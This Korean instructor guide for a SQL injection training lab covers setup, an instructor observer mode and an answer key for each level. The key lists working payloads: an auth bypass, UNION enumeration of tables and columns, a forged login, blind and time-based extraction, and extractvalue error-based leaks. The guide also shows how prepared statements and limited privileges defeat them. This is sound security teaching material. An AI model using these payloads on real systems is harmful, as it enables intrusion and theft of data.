# INSTRUCTOR_GUIDE — 강사 가이드

## 수업 전 점검

`start` 및 자동 테스트는 DB를 초기화합니다. 보존할 실습 데이터가 없는 환경에서 실행하세요.

1. `cp .env.example .env` 후 **모든 비밀값 변경**(특히 `INSTRUCTOR_TOKEN`, DB 비밀번호).
2. `./scripts/start.sh` → `./scripts/test.sh` 로 **모든 항목 PASS** 확인.
3. Observer 강사 모드 접속: `http://127.0.0.1:8002/?token=<INSTRUCTOR_TOKEN>`.
4. (선택) phpMyAdmin: `docker compose --profile instructor up -d phpmyadmin` → `lab_instructor` 로그인.

## 학생 환경 점검
- Docker Desktop 실행 여부, 8000/8002 접속 여부, `/health` 200, Burp Proxy 설정.
- 학생 4명 동시 사용 시 Time-based(Level 8)는 동시요청 2 슬롯 제한 → 순차 실행 안내.

## 강사 모드 사용법
- `?token=` 이 맞으면 **모든 레벨의 최종 SQL·DB 오류·행수·실행시간·소스위치** 표시(Blind 포함).
- Trace ID 로 필터: Observer 표의 Trace 링크 클릭 또는 `?token=..&trace=<id>`.
- 학생 모드(토큰 없음)는 Blind(6/8) 의 SQL/결과를 `🔒` 로 가림.

## 단계별 예상 결과 (요약)
- L1 `' or 1=1 -- ` → 첫 행(admin, idx=1)으로 로그인.
- L2 `0 or 1=1` → freeboard 전체 행.
- L3 `order by 8` 성공 / `order by 9` → `Unknown column '9'`. `0 union select 1..8` → 숫자 출력.
- L4 `database()`→`sbadmin`, tables→users/freeboard/notice/pds, users 컬럼→idx,email,password.
- L5 이메일칸 `x' union select 6,'learner@example.com','pass123' -- ` + 비번 `pass123` → idx=6 로그인.
- L6 true/false 화면 차이로 `lab_secret.secret` 1문자씩. L8 은 `sleep()` 지연(상한 `LAB_TIME_MAX`).
- L7 `extractvalue(1,concat(0x7e,(select database())))` → 에러에 `~sbadmin`.
- L9 none→prepared 순으로 표면 방어의 한계 시연.
- L10/12 동일 입력이 Prepared 에서 무력화. L11 good 모드는 허용 밖 sort 를 idx 로 폴백.
- L13 저장 payload 가 관리(vuln)에서 발동, safe(재바인딩)에서 무력. L14 SP 내부 vuln/safe 비교.
- L15 `lab_app` 은 users 노출, `lab_limited` 는 `SELECT command denied`.

## 막혔을 때 힌트 / 정답 공개 시점
- 각 레벨 페이지 상단 `목표` 박스에 힌트 포함. 정답 payload 는 강사 모드 Observer 의 실제 SQL 로 즉시 확인 가능.
- 권장: 학생이 5~10분 시도 후에도 막히면 Observer 강사 모드 화면을 함께 보며 최종 SQL 을 해설.

## DB 초기화
- `./scripts/reset.sh` : Seed/AUTO_INCREMENT 초기화 + 실습 로그 초기화(다른 볼륨 미접촉).
- 학생이 데이터를 망가뜨리면 reset 후 재개.
